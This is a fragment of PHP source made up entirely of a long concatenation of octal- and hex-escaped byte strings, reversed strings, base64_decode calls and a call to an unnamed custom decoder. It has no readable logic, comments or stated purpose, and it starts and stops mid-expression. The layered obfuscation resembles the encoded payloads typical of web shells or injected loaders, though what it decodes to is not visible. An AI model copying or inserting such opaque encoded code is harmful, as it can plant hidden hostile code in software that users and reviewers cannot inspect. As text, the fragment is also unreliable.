2\227\255\267\171\365\60\314\263\1\41\146\63\334\52\130\245\201\241\265\354\320\73\235\261\262\43\320\346\336\221\261\122\226\135\50"."\232\135\77\207\141\6\144\114\257\55\364\146\6\241\242\131\254\370\231\354\203\41\134\272\260\126\33\346\26\111\3\126\311\316\203\351\152\357\220\201\352\202\221\255\147\370\65"._kodDe('LCd10F6y/lShk7Gll3h+PCMxRFONlhqDUdb5yFv1xL0+FnuZSW1W4gQTHTJ3HVBi')."\163\220\66\260\135\110\313\126\310\162\202\1\135\147\326\257\200\275\216\260\67\260\113\304\56\37\340\106\136\27\352\332\114\257\20\214\261\236\101\262\122\300\301\244\234\63\135"."\x70\xa4\x68\x14\x72\xc5\x26\x1d\xd3\xe2\x76\x11\xd4\xe2\x2a\x80\x5b\x15\x70\xf7\xb3\xe\xd0\xbb\xc2\x91\x1c\xa8\x3f\x6d\x7b\xd8\xb4\x60\x38\x6\xcc\x4c\x3a\x87\x56\x87\xab\xd4\x4c\xaf\xab"."\x4c\xe\x65\xfa\x0\x6f\x4c\xdf\x4\x70\x54\x8e\xcb\xa8\x94\xc1\x5c\x3\xd4\x4b\x66\x4c\x95\x3\x1\x36\xc4\xbd\xd2\x6c\x52\xbd\xb1\xa3\xd9\x3\x1\x19\xec\x97\x63\x8d\x2\x6a\x45\x2e\x17"."\x70\xdf\x62\x53\xc9\x1f\x18\x3\x7a\x53\xca\xd6\x7\x4b\x7a\x41\x9c\xd2\xda\x3\xd2\xc0\xe3\xeb\x67\x5d\x9d\x6a\x2a\x94\x5c\x2c\x99\xa5\xe1\xeb\x51\xc\x85\x54\x61\x5f\x2c\x75\x4b\x94\x20".strrev('lg§çzÿ¦øÁ{ß·»o6›ÛÉß7óól¸ï—…øÀşßo&`!îƒ<£').base64_decode('v/f87fee8vaZd37w4HnjF97+9mnbxq+5ZfyGM7c/sO3th85865Zzt9+7ccc1Z48=')."\x9f\x71\xf7\xf6\x7\x2e\x1f\x3f\xeb\xba\xf1\x33\x2f\xdc\x71\xc9\xf9\xdb\xb7\x5d\x83\xd2\xef\x38\x4b\x94\x8c\x92\x8d\x6f\xbc\x12\xe7\x7d\xf0\xd4\xf1\x7b\xef\x7d\xfb\xe7\xb7\xf0\xd8\xf\x1e"."\374\21\43\246\364\167\221\356\340\133\145\314\326\210\214\216\262\100\1\204\324\355\200\322\231\323\321\10\53\351\254\236\36\300\206\111\116\126\267\24\207\30\50\151\350\137\301"."\x2c\xf8\x29\xc2\xd1\x1b\x7b\xb6\x62\x14\x70\xb4\xc2\xe6\x26\xc0\x91\x32\xa5\xe7\x8b\x18\xb5\x60\x94\x82\xf4\x12\x8f\xcb\x52\x59\xc2\xbf\x4a\xc3\x4c\x23\x2a\xa0\x15\x1e\x6b\x31\x57\x35\xf8"."\23\216\235\260\132\115\351\323\20\40\323\240\364\241\154\12\263\355\127\34\223\175\347\107\371\244\173\26\101\305\151\345\315\140\123\313\270\53\303\24\212\125\150\230\144\241\116"."\x4f\x2b\xca\x50\x8a\xac\x2a\x37\x49\x70\xad\x37\x37\x31\x91\xa3\xdc\x23\x1\x9a\x4f\x72\x96\xee\x53\x68\x53\x7c\xa\x39\x3a\x55\xdc\x37\xd1\xf0\xd9\x38\xe3\x6f\xe4\x35\x26\x37\xdf\xd2\x8b"."\71\55\315\233\136\34\255\70\210\162\153\344\163\133\117\327\222\25\206\221\167\316\25\211\326\165\311\251\220\120\36\155\327\71\246\31\316\41\102\47\116\357\310\351\266\350\6".base64_decode('DQoNL6qI00lLzxjMoFbPk5TMSJ3olbklbxotAct1PNS4sJgt4gvAzvyFcNEQjr0=')."\x54\xa9\x5e\xf8\x16\x17\x2a\x64\x68\xce\x7b\xe4\xc4\x17\x4c\x4b\xb3\x74\xd\x17\x27\x6b\xf0\xfb\xfd\x92\x7a\x36\xc7\x4f\x65\xf0\x17\x14\x27\xce\x4a\x11\x2c\x82\x57\xf3\x44\xf0\x16\x6e\x6b".base64_decode('gJZ5f79uOw3kdpEyTUENnRuYjj7IgpgVmIM+ySjBIu4uSI2in/NLNrsSUCrkGBQ=')."\175\242\44\211\122\1\317\133\203\273\47\172\41\43\145\232\257\245\235\46\251\67\175\60\124\1\321\113\155\232\210\327\63\307\302\160\113\175\37\206\4\54\157\273\173\66\121".strrev('8QØö%=¸\\ÄE‘<¬–øA“³¸˜şº[H GØJ³c?¡¤Ñ‚|ü¯')."\16\243\240\163\254\52\331\302\250\134\353\203\373\143\321\202\27\102\303\330\72\131\105\173\270\55\55\144\265\137\167\124\140\145\154\266\251\45\243\141\265\63\304\256\34\150\305"."\x62\xd0\xce\xc\xd8\x41\x6c\x1f\x68\xc\xe9\x31\xa3\x37\x88\x2f\x58\x62\x6c\xb\xf4\x32\xdb\xc\x42\xdd\x55\xad\xd7\xb4\x1c\x69\xd\xa8\x19\x3\x9a\x17\x8b\x36\xab\x2d\xd1\x4\x5f\xa3\xe".base64_decode('u7gX6oyqyWRcqpBcFFuuLo63qOF4fHEU8BjmuEEitfhakjg3xiFxPQkfnMhWWjI=')."\57\203\57\43\343\375\72\251\200\15\43\132\60\341\266\120\202\233\212\317\12\324\5\246\213\264\250\102\25\133\314\67\261\273\220\311\124\50\121\341\112\72\275\252\16\363\17"."\327\323\41\103\133\174\231\22\216\307\272\332\73\222\364\46\66\205\167\304\245\170\142\20\14\321\354\302\172\171\64\24\37\351\214\205\302\21\45\332\221\212\63\213\177\156\242".base64_decode('Se56JHmYDYFl6/xCOuSnAfk+ilwiLwlWzCpfdXdV99Tumu7aNYFuuycobX6GPD0=')."\x10\xe8\x6c\x81\xee\x35\xf0\xaf\x8c\xd\x8\xd3\x9e\x4c\x2e\x81\xb\x4c\xf1\x44\x28\x1c\x63\x4d\x41\xe8\x7\x9f\xf1\x70\x94\x7e\xbc\x75\xe9\x96\xed\xf7\x5f\xf0\xd6\xd5\x9b\xc6\xcf\x3e\x1f".base64_decode('FbTjqlN3XHE34nUwf7PpvLd+fcGOS2/fcR7wJcrbt9+zfdtDb116y/imK3dcft8=')."\x5b\x57\x9d\x4e\x23\xde\xf9\xe5\x96\xf1\x73\x6e\xe1\xd\x53\xde\xb9\xe4\xd7\x3b\x2e\xb8\x91\xf3\x3c\x94\xd5\xf1\xa1\xdc\xef\x9c\x71\xfe\x5b\xdb\x36\x61\x8e\xe7\xfa\x53\x76\xdc\x75\xee\x8e"."\153\316\37\77\347\347\343\77\275\345\255\13\156\37\377\305\151\343\77\76\377\355\333\57\73\326\213\110\64\274\212\115\5\330\21\4\127\167\333\123\153\350\360\166\333\323\360"."\xd0\xd6\xa2\xdf\x1a\x7c\x81\x0\xfd\x32\x3b\x68\x62\x2a\xbb\xa4\x2b\xd2\x11\x8e\x78\x2f\xe4\xc8\x41\xb8\xcd\x3f\x95\x62\x8\xb5\xc\x1\xf6\xd4\x6\x6f\x0\x2c\xac\x92\x8b\x56\xd5\x13\xb6"."\x62\x3d\xcc\xbf\xd4\x28\xa9\x31\x2d\x91\x64\x38\x11\x6d\x8e\x80\x89\x3a\x9f\xa8\xc9\x84\x41\x3\x73\x4\x4\x4d\x26\x96\xf2\x6f\x7e\x7\xad\xcc\xfb\x82\x52\xc3\x90\xb9\x56\x71\x75\x44\xb"."\244\315\134\51\137\40\215\125\252\260\205\123\225\17\223\25\162\73\110\251\302\233\60\2\350\151\264\364\152\360\15\155\142\2\133\275\242\332\127\347\233\136\253\200\153\6\232"."\x3\x1c\x32\x28\x55\x60\x29\xcd\xf3\xb9\x2a\xf1\xf5\xba\x42\xd3\x7d\x75\xb5\x4a\x55\x71\xa0\xa\xda\x25\xc6\x15\xb5\x5e\xa5\x29\x6d\x45\xf3\xd5\x40\x83\xe5\xe6\x8a\xb4\x88\x7c\xda\x8e\xa5".base64_decode('GYiCKmkfB/H86NflZCEdEDnoPKEUXpgS6mhxp6S+GTqriVViOkDHV57m6lqlFww=').base64_decode('/ytEkmyuwWhyDUbNNKATnYv4fFOrfoVe+qLN0mw2UQAlU4WhdLZYWhN1A00OTY8=').strrev('åÜ3q…eÃï}¡¬àu#?vó?i"eFiÄq'."\n".'ÄŸ8bØ#Är!%ç¶x>')."\xbe\xbe\x16\x49\x85\xdb\x28\x96\x27\x25\x34\xcf\xf4\x4e\x76\x21\xaa\x18\x4e\xc5\x85\x22\x5c\x12\x81\x74\x74\xb9\x60\x82\xb0\xf\x49\x17\xed\x68\x8d\x27\xda\xe9\xb5\xad\x64\xb8\x2d\xd2\x1e"."\12\0\21\247\230\100\323\143\126\115\151\122\252\61\345\243\240\152\327\360\223\212\330\220\245\110\255\150\135\251\16\342\273\350\50\24\373\241\61\60\373\12\271\272\253\221\54"."\x4d\xd5\xf4\x96\x3c\x14\xc9\x7d\xc3\xc4\x13\x29\x15\xd\x0\x90\x67\x89\xea\x56\x4b\xbb\x85\x64\x27\x8d\x6f\x1f\xd\x71\xbf\x7\x85\x1c\xb7\xf7\xa3\x5c\x6\x70\x14\x88\x15\x33\x99\x23\x80"."\x4c\x2f\x73\x2d\x83\x2a\xc5\x75\x85\xe3\x1d\xad\x51\x76\x73\xad\xa5\x17\xea\xc9\x98\xae\x44\x2d\x89\x28\xbe\x9e\xd\xed\x52\x58\x51\xd2\x7d\x41\x14\x10\x46\x11\x28\x50\x64\xea\x40\xf4\x2d".base64_decode('7injCM4LoIBgBVCAb0I4leQDB9ef7ODfgodGAWygJ6jyshb+3cavneKIeEIKhBI=')."\241\366\44\17\46\226\361\13\21\34\106\57\106\250\35\135\355\142\47\210\205\226\42\44\212\13\306\205\121\361\232\300\324\205\265\335\364\162\31\375\244\77\47\260\20\276\160"."\323\263\156\272\117\231\275\241\26\322\260\353\130\252\223\105\123\246\212\132\226\304\324\130\174\21\15\23\337\74\221\102\106\210\71\312\52\5\361\336\51\301\173\333\154\113\343".strrev('@&Õ5	=Œ+4µ‹.#^Â& îê¯W¿¼"'."\0".'"‘{¸HY|GJ«Ğ­¸AD«')."\356\20\333\136\327\370\140\47\121\163\146\77\147\40\73\132\30\33\101\177\227\263\17\102\103\41\3\222\235\213\71\166\153\214\136\127\123\273\327\167\117\351\366\7\350\15\75"."\xcc\xd4\x74\xfb\x44\x93\xd4\xc8\x72\xb4\xf7\x26\x93\xae\xeb\x85\x2a\x71\x60\x2\xa5\xa3\x5e\xc2\x17\x5d\xcd\x34\xd0\x8\x3f\x20\xd4\x35\x2\xdb\xa\xc1\x5\x4d\x7c\x32\x23\x4b\xd6\x77\xa0"."\x7f\x8b\x52\xeb\x23\xe8\x5f\xc\xfd\xc4\x52\x68\xba\xc\x9e\x0\x2d\xd5\x58\x74\x71\x64\x3d\xfe\x4f\x44\xd4\xf2\x81\xa4\xf7\x72\xdc\x19\xa2\x1d\xeb\xd1\xff\x88\xf0\xac\x8f\x76\x78\xb\x6b"."\216\244\226\105\42\64\1\373\206\137\221\24\21\42\350\252\344\273\11\133\322\103\264\260\254\207\242\125\265\206\14\246\277\147\132\255\252\6\355\56\300\27\176\201\277\246\372".base64_decode('+OnVsLeEkmFBlV0IUY4LxO7djQjcIxGEFyXiXZ1SuC20NNqxiIWCU9nXVChaaYk=')."\46\321\20\205\31\62\12\107\111\162\30\30\121\302\56\311\334\260\13\245\133\20\305\107\1\211\225\307\102\2\245\330\356\125\326\334\25\215\265\310\67\252\161\102\330\150\10"."\265\207\275\146\62\153\34\13\223\273\325\54\200\207\234\175\23\164\143\1\62\6\54\100\7\200\205\310\160\261\0\161\310\304\2\244\243\54\200\245\226\110\7\213\103\142\52".strrev('! äÍÒ)ĞF’]ÔJÇG©5q©'."\0".'>Ã€ªÁ¦>úé^™ùÀ•ø†Õ™ì™1').base64_decode('LpQA0W/3moWES17DEJNef3VShpNz1QLX5FAtUXI3UaqHXTogykXVlBTcZAOXAUI=')."\235\105\265\341\240\71\26\132\41\154\70\110\164\312\64\350\26\255\70\135\132\303\45\46\160\51\340\203\137\150\321\376\364\247\33\202\114\33\122\5\133\257\17\66\137\166\371".base64_decode('wC2Yd3dXTTRakICNGQSraJDlMviel85iNxCqk2fadCK0Cb011X2LcEsi3kk5EyU=').base64_decode('2qpQJwNKNdWWVwPLFU5E8OqgqVhcTbVLz7WgWoEbx7XuXNGOlshypdrIjKiapkI=')."\146\5\255\105\126\220\122\126\22\53\201\266\25\316\173\354\254\71\254\310\350\305\344\350\60\205\245\4\312\225\261\154\304\135\0\273\335\351\3\141\235\307\120\116\231\106\105"."\223\150\303\216\305\110\117\121\224\141\143\6\327\247\360\133\375\30\210\205\22\252\77\205\202\130\4\55\210\106\105\226\247\22\41\14\44\134\351\276\373\240\77\204\240\140\251"."\xc9\xca\x13\x97\x13\x2a\xe5\xe5\x2\x6b\x40\x79\xb0\xc6\xc5\x3a\x52\xa6\x12\x33\x8f\x80\x41\x64\xcb\x93\xfa\xc4\x63\x88\x6\x81\xe\xb3\xac\x5f\x58\xc\xdc\x38\xd\x75\x26\xa2\xed\xa1\xc4"."\12\30\62\41\33\300\12\64\163\256\213\257\42\140\330\135\322\325\353\16\324\152\371\52\66\235\143\116\141\221\234\313\50\54\152\15\54\0\74\363\300\360\120\377\171\52\277"."\131\313\224\53\65\200\307\125\76\366\301\74\34\220\53\102\114\131\226\107\44\207\207\304\254\1\356\303\254\310\261\362\135\47\341\340\17\157\222\170\222\31\265\157\15\165\305"."\144\10\14\225\262\70\262\342\133\326\10\153\151\245\65\302\342\230\232\206\257\66\350\117\315\54\350\37\165\272\120\123\217\144\325\122\301\66\372\13\334\233\30\264\12\366\326"."\256\124\134\105\373\107\42\202\251\71\364\210\17\253\324\136\111\36\227\47\5\212\301\11\270\267\304\157\351\32\113\123\251\153\74\77\327\110\105\72\26\105\73\42\115\355\243".base64_decode('0WSoXWENB50b9jM2F8qJxtUY4olVWa0WjYP2ONAre9xQheOOgCaMqR2rJPmwI4Y=')."\325\150\376\103\342\176\76\127\150\223\270\122\57\116\54\355\32\206\331\200\117\53\60\224\162\37\363\31\266\24\331\315\155\360\355\347\265\172\226\301\302\160\232\37\257\60\173"."\155\104\256\362\256\14\135\322\105\172\55\43\131\111\53\254\146\162\356\123\160\373\241\103\33\142\116\305\76\55\220\34\250\352\242\375\171\335\266\371\351\57\221\156\330\247\223".base64_decode('FQ4FZD97Lc1srEoFJ6nn4OS9pZeYnIurXXzgbMkUnRyliPGmLhA9GaGkKO+4lEo=')."\0\143\302\261\36\76\305\20\145\366\60\331\135\164\162\314\50\172\217\55\12\146\247\156\345\15\162\74\263\114\334\163\341\361\122\156\162\161\310\374\266\301\55\25\120\15\235"."\174\146\375\314\202\211\273\116\45\10\243\160\1\225\137\336\100\123\112\362\112\326\375\204\111\202\142\55\70\50\75\326\323\70\307\64\333\265\302\150\312\134\152\350\200\246\55"."\361\145\35\261\70\363\57\306\234\11\322\120\377\30\340\75\102\276\0\13\70\354\303\322\240\346\145\214\155\307\334\204\344\161\366\130\31\7\310\144\12\234\14\45\302\155\110"."\x4\x57\x5b\xa3\x68\xf\x41\x1b\x94\x28\xa0\xd\x65\x45\xd2\xbd\x34\x4d\x12\xb4\x9d\x19\x63\x21\xfe\x11\x6f\xa2\x31\x66\x21\x85\x2f\x1b\xe8\xe\x38\x9b\x72\x2d\xe0\x68\x1c\xf2\x6\x74\x7c"."\x4f\x87\xde\x95\xc0\x77\xa9\x78\x46\xea\x68\xe9\xbb\x33\x75\x49\x7e\x18\x27\x58\x9b\x15\xf3\x85\x21\x21\xaf\xd0\x22\x7a\x96\xef\xae\x30\xa1\x8b\x6d\x11\x65\x23\xd7\xa2\xbe\x33\x93\x70\x5".base64_decode('SmoimSS65clDEIhe6oC5zkK08JuDiGVHXG1D9DjOdm3DTrnoH8sFq5UcvATJ9VA=').base64_decode('kInmk5MbejoIctY6RAL5F7OHAK9OYrcM0Z8V+YwfNRysKzK6w73p4FUWknz9SJc=').base64_decode('a/OcQA1L7u20IR3fgmIahzKzFOhKeee4+yS3OQA+QUrGuxLsmAOHyT3LRCS8gp8=').base64_decode('OHBoa2ipF4LXQCq0qCKYK4cwnEhhaiKOtWuRWKsnQ7KNexp0w9RYtGNxxQi0l7c=')."\113\131\50\60\232\212\264\173\141\356\22\222\21\274\176\105\270\71\26\17\113\321\321\170\371\110\160\146\201\3\251\16\216\2\203\253\153\272\327\21\61\242\1\111\23\231\365"."\130\130\367\253\110\326\137\330\275\241\266\246\73\270\60\60\225\353\230\50\75\221\156\144\116\0\266\31\335\157\360\2\360\226\301\200\64\33\204\202\201\0\124\302\77\202\335"."\101\356\302\211\221\121\160\327\232\244\316\156\134\255\360\70\217\140\367\266\3\136\157\210\121\172\24\251\46\127\44\371\150\123\124\254\24\357\302\57\232\114\66\56\360\44\106".base64_decode('/zrlpNiepWJCF4K67rXKoIBhirUgFm3GTJewPx0x4mKbQaCAqwhErgeElAtrLsk=')."\xd6\x66\x1\x6d\x3b\xb0\x23\x86\x11\xd3\xb6\xa8\x2d\x7a\xe2\xe2\x58\x7b\x47\xbc\x73\x49\x22\x99\xea\x5a\xba\x6c\xf9\x8a\x95\x30\xba\xc\x5\xfa\x14\x3f\x73\x87\x5\x7e\x16\x83\x43\x9a\x15".base64_decode('HGK+eZdinlu3gzLPw4Goj4jcMWIVpKI4j8W0IVg5ipYWzBec6ROk6LT0XtN0Jog=')."\135\332\376\355\5\103\344\252\156\273\207\341\134\60\243\17\5\5\267\302\110\30\227\64\140\277\366\313\76\202\61\172\312\214\127\246\327\263\371\2\100\150\327\245\55\132\0"."\353\231\345\336\12\177\336\237\351\116\55\302\316\22\273\127\362\271\66\54\311\133\141\332\54\144\14\351\242\275\226\146\74\126\51\75\300\357\261\143\352\157\373\207\15\206\115"."\xc7\x73\xf1\xb\xc\x98\x54\x2d\x4d\xc5\x51\xc9\x78\x6f\xd0\x8f\xa5\x11\xbf\x96\xeb\x37\x11\xbf\x95\xcd\x33\xa8\x36\xe0\x8a\x17\x7e\x32\x8b\x66\xce\x60\xe\xcc\x6\xfd\xa8\xa\x29\x8e\x26"."\106\205\263\75\24\233\53\160\37\243\70\140\363\220\274\304\310\56\303\355\154\360\136\326\346\131\321\34\310\75\240\46\111\47\32\224\231\340\362\267\25\61\276\322\75\107\346"."\xa8\x55\xc8\x8d\x98\x75\x22\x5e\x6e\x69\xd0\xa7\x8\x6f\xdf\x4c\x5d\x59\x99\xaf\xc3\x8a\x26\xe9\xe2\x66\x5a\xbe\x77\xcf\x88\x71\x7e\x40\x9c\xa0\xe4\x7\xb8\xc5\x44\xda\xc5\x9c\x60\x3e\x40"."\x84\x2c\x89\xff\x0\x3f\xdb\x28\xae\x79\x94\x59\x4f\xc1\x9d\xcb\xe6\xd1\x84\xf4\x6e\x80\xcb\x19\x82\xec\xaa\x3c\xb4\x2c\x39\xd3\xdf\xd6\x1e\xa\xfb\xd1\x96\x52\xcf\xc\xb6\xd1\xc6\xde\x9d"."\x42\x3b\x3b\x43\x2c\x6d\xd8\x9e\xc9\xe4\xd\xa\x99\x36\x5b\xc9\xa2\x99\x0\x8c\x29\xf7\x27\x7a\xbc\xdb\x8f\x2e\x5\x52\x7\x99\x69\x4b\xcf\x60\x5b\x16\xc6\x49\x52\xa8\x7\x93\x28\x50\xd0".base64_decode('CRqmjteYtVdW4w3G3QBaVaHe5RXrXV6p3uWeepeX10tBHozVisVwFuOCi5q6QGk=')."\71\300\166\262\76\154\227\43\133\374\200\146\223\232\361\6\120\164\13\145\252\63\74\275\55\276\370\252\350\223\326\213\253\270\0\220\374\14\333\70\155\106\304\162\232\355\54"."\x75\xf9\xe7\xf9\x4e\xaf\xb7\xd8\x89\x44\x3b\x17\x83\x2c\x86\xca\x41\xd3\xb6\x83\xd8\xe7\x1f\xe1\xd8\xb9\xbd\x5a\x3c\xc9\xce\x6e\xdc\x7d\xa2\xaf\x5d\x48\x52\x37\x78\x21\xe3\x2e\x59\xb9\xc3".strrev('fb%0F×›½ò]	~J‰Ñœ\'v]m4R2%Ft@Æû¨G‚AUû„wéÜª•ÕáV').strrev('ï¸´Q'."\n".'LÛÖŸîNJáILÀ>ºÚØü{®£ñywŸÌˆ'."\0".'vVÓæ^’|').strrev('£ëå^¤¹£%¿kÔ¬¬ş"˜ld³~°™¨*»±v£Y|5(nKğ¯ëŠzb')."\314\31\257\147\5\170\374\367\166\57\352\156\357\116\311\303\344\130\132\137\37\152\266\344\22\324\325\26\341\56\30\320\17\237\64\13\153\327\11\235\15\303\241\304\224\212\276"."\x8a\x21\x92\x48\x1d\x41\x94\x2\x5f\xe2\x1f\x56\x39\xe6\x92\xe7\x23\x2a\xe0\xee\x12\xc\x7\xec\xed\x13\xf6\xaf\xc5\x92\xf4\x82\x89\x8c\x2f\x78\x1b\xe7\xaf\x4e\x60\xa5\x2\x75\xf1\xcc\x48"."\6\161\275\14\156\334\233\130\217\320\320\25\232\115\166\171\152\135\25\302\304\252\206\252\343\153\320\157\155\225\257\12\63\247\44\214\147\21\3\110\73\252\32\216\257\41\37"."\xb5\xe0\xe5\x64\xc\xae\x53\x48\xde\x4f\xc5\x49\x38\xa8\x13\x16\xa2\xa1\x95\x8e\x6f\x16\x92\xd1\xc0\x6b\xbf\x3e\x58\x1f\x1c\x6\x7a\xb0\x70\x10\xd7\x28\xde\x4e\xf0\xee\x1\x23\x2a\x22\x7b"."\xec\x58\x42\x95\x89\x2f\x90\x75\x18\x75\x39\xa6\x8d\xb7\x84\x91\xe5\xf6\x96\x59\x8c\x8a\x86\xda\x57\xfa\x85\x3f\xe2\xc6\x85\x23\xf9\x9c\x2\x92\x66\x53\xf5\xf4\x40\x5d\xb5\xc2\x1e\xdb\x68".strrev('­ ,Ìmy€¼¢hwAÅåâ4¶`©¾Å>;z:æ˜co°\\/VçúµJîª')."\16\121\250\174\40\15\203\331\305\251\230\160\21\135\320\235\141\323\202\223\152\40\260\365\354\342\117\126\242\75\171\233\55\155\342\130\241\1\353\47\131\367\273\212\243\245\202".base64_decode('H6sh/EnZxZ3HAX2dOz1WJLjTy6QxLchHXnzSxwQaFPnVCMkBrx/zBHRVMp0WwDA=').base64_decode('1WQgQ3ZnzPAak0TVTRJP8LQXD7UfMV0Y/9GiQtuvo1dK4n7GwPu4gXcUSBY8uX4=').base64_decode('+dWEEcRx42jsU92P59dvZCaKEYu6YlPTgCqVknSVjIy3SmIc4C+VWIUVC5XlAZY=').strrev('˜üÉôi“2*PÛfG/èy¬ÃF~¥^-§î\\oI{™{ŒÎkšæqsËÊ"t€')."\354\143\164\100\274\153\300\372\206\47\134\162\374\356\2\213\141\344\53\234\21\20\127\72\321\132\327\213\31\320\121\52\263\113\16\352\211\202\233\256\44\154\361\243\162\207\377".strrev('KgNM¤®["Í‚š† †‡[¤ô@noH–&½<X}Ÿ¤\'Ä¢d®Û†ØÆ)(')."\x85\x81\x26\x29\x52\x71\x4c\x53\xc9\x6b\x85\x51\x90\x6\x26\xdb\xd\x93\xed\xf9\xb8\xa2\xa6\xc9\x81\x99\x7d\x36\xa\x0\xbd\xe6\xee\x5b\xf1\x3e\x22\x9c\xf9\x51\xff\x35\x10\x43\xd5\xf9\x1".strrev('C¥¸j'."\0".'’d²C´Qk¬gRèo’(^ŸÄ®gX¬ü±¡Ï&öŠ†ZûĞô’‰Ro'."\0".'FÒü').base64_decode('DXV2VozgHA7WKmIzgMBa9kxQmqFho5HvV9L4jkVTFYZWKbaVZl5vq4JAeEkCIXA=')."\65\32\220\245\32\147\121\372\120\237\374\344\213\106\127\57\150\14\32\13\370\354\10\367\102\226\51\256\220\4\202\307\141\361\53\210\155\205\12\123\60\72\310\246\13\4\332"."\52\234\11\51\112\243\246\320\201\157\252\306\206\34\175\325\112\26\155\340\334\200\162\201\67\163\7\73\120\152\14\152\162\44\136\212\11\223\361\313\134\352\32\342\232\375\212"."\107\26\41\311\107\66\171\52\41\254\25\226\226\147\301\205\7\322\162\24\235\111\162\311\245\74\175\220\250\16\202\102\300\164\237\341\360\143\217\12\110\21\340\17\16\25\265"."\xf4\x0\x46\x41\xb1\x5f\x40\x9d\x10\xd1\x89\x65\x1a\x1a\xe1\xf2\xfd\xef\x48\xb6\x1a\x25\x7c\xe1\x8b\x68\xe6\x2d\xf1\x80\xc9\xba\x75\xb4\x20\xcc\x22\x6c\xd8\x50\xe\x3\x33\x50\x6f\x54\xa8"."\x68\x78\x41\x18\x73\xbc\x30\x2c\xa3\xb\x18\xda\xf8\xdc\xd5\x50\xac\x95\x13\x9\x8\x4b\x43\x7f\x45\x9e\x58\xc7\x22\x11\xa0\x4b\xcb\x15\xb9\x8a\x59\x5c\x93\x50\xf7\xaa\xea\xc0\xd4\xd\x1b"."\x82\x6\x33\x8a\x62\x6\x1c\x2c\x6f\x80\xa7\xa6\xe1\xee\x80\x3b\x3d\xea\x9\xc\x3d\x4f\x8\x0\x6f\x4a\xca\x70\x9e\x8\x8b\x6f\xdf\xe0\x54\x71\x49\x8d\x1b\x3f\x29\xd8\x22\xaa\xa9\x69\xc1"."\x2a\x7e\x10\xd4\xc3\xe2\x18\xd7\x68\x4c\x9f\xcb\xa6\x7f\x2c\xeb\x4f\x2d\xe3\x9f\xe1\xe\xc1\x17\x73\x24\xa7\xf4\x24\x40\xf4\x2b\x21\xb7\x5b\xdd\x85\x43\xfc\xe9\xd\xf9\xb2\x7\xfd\xe\x15"."\x8b\x72\x90\xbd\x37\x43\xe\x25\x72\x46\x6f\x90\xaf\x76\x7a\x50\x11\x48\x8b\xbb\x5d\x2c\x9\xa1\x35\x1e\x38\xb6\x5c\xf2\x44\xe0\xbb\x2b\x4\x3c\x84\xa8\x27\x62\xd3\xd6\x7a\xe1\xa8\x2c\xe"."\344\37\215\166\332\62\212\216\213\116\321\247\361\252\310\323\50\153\265\41\215\46\251\122\100\240\157\252\42\256\341\253\20\135\242\61\100\20\104\123\32\61\1\122\54\75\327"."\x54\x45\x9a\x6b\x67\x75\x1d\xe5\x27\x24\xa6\x52\x25\x28\x63\x95\xc2\xa8\x63\x5e\xe3\x23\x66\x39\x26\xda\x29\xf9\x2d\x23\x78\x94\xa8\x2b\x1\x77\x25\x42\x1d\x70\x10\x4\x3c\xd8\x71\xab\xe9"."\357\361\307\361\375\0\277\220\225\323\55\152\20\116\250\16\71\32\354\23\112\60\170\43\251\63\21\117\305\303\354\231\231\112\332\262\231\214\341\265\351\265\70\41\30\261\153".base64_decode('Pdw+gqXgLEQQIDD9VqlQ4KZmmKfk+xwRoPUMrAF6zJbMlhyxX2I/8il839cGsOQ=').base64_decode('+A+7HUSZV1HFZVMdu5nBrNPELTGWkhyWEqpc6O9xRVUonuqLU9wwTC+4VCW0WTk=')."\x93\x79\x1d\xa8\xaf\xab\xab\xf3\xd7\x4d\x47\x7f\xf9\xc9\x31\xb0\x76\xd\x75\x75\x65\x49\xea\xea\x1a\xc8\x5f\x1a\x41\xb4\xbd\x30\x17\xee\x18\xb4\xf4\x19\xcd\x82\x4\xc3\x3a\xf3\xf5\x1\x1b"."\x42\xde\x28\x94\x18\xf7\xb5\x2a\x8c\x2f\x81\x29\xb8\x69\x3d\x8c\xe1\x60\xed\x47\xd3\x40\xbc\x17\x32\xf2\x31\x5f\x92\x19\xe7\x2b\xe4\x64\x12\x42\xba\x77\x10\xf8\x91\x2f\x4c\x2c\xdb\x87\x31"."\275\140\337\210\11\102\243\112\6\5\332\313\357\22\242\144\2\175\346\323\253\233\115\274\121\221\102\146\225\134\131\200\15\56\5\12\177\312\176\26\341\227\337\47\200\114\164".strrev('gÑ%àì'."\0".'o¸å	êüÑ Ö>Pq®IÑÌªH\'ï4è6‚ˆ·n<¡¦®çc')."\60\350\365\71\30\303\12\230\234\65\207\125\261\7\343\340\211\74\104\206\24\313\126\14\15\63\322\365\112\74\256\214\32\63\264\143\6\13\140\377\100\256\313\17\30\71\327"."\45\141\125\52\133\36\315\371\70\241\74\112\150\255\206\370\173\37\324\272\220\125\257\300\302\3\376\0\157\21\344\131\66\152\20\332\260\157\331\374\71\336\271\43\323\140\231"."\342\212\157\331\323\232\54\44\115\6\323\236\47\277\303\74\207\101\42\14\100\15\132\302\334\21\242\124\200\67\312\223\47\224\221\36\177\264\205\7\304\60\167\277\52\273\105".base64_decode('pAYAkpmIDT7exYk/K2NIEogCRcvsR7Njy31F8M7KYJ68PGWFRLxDcjoZiA8v2Js=')."\206\200\150\342\166\260\46\336\104\225\222\212\373\247\22\320\275\316\244\210\60\177\115\107\6\142\1\113\266\361\40\326\261\356\62\260\40\344\206\360\226\175\13\256\60\211\333"."\x81\x37\x2d\x65\xdb\x40\x9a\x4c\xd0\xa\xac\xd\x91\x75\xb6\x86\xc9\xcc\x47\xf0\x68\x88\xa3\x5c\x37\x9c\xc2\xa8\xfc\xeb\x3a\xfd\x49\x11\x72\x93\xd3\xd9\x73\x9a\x40\x90\x8\xde\xe3\x2\x88"."\231\215\147\0\5\256\302\352\152\152\222\263\271\343\336\370\361\305\354\343\22\226\12\17\41\127\337\311\172\155\74\174\252\254\232\300\213\256\215\277\370\130\1\351\334\210\125"."\206\101\144\323\306\5\64\160\202\44\205\220\230\305\70\261\14\153\357\140\111\147\334\243\104\275\24\107\320\56\240\64\251\254\145\72\134\262\300\361\241\214\104\221\143\62\357".strrev('á1oà]5s>Ã…»"ûµè\'ÂKı<EÓb vÆ»VvŠO2cÉ0c®=D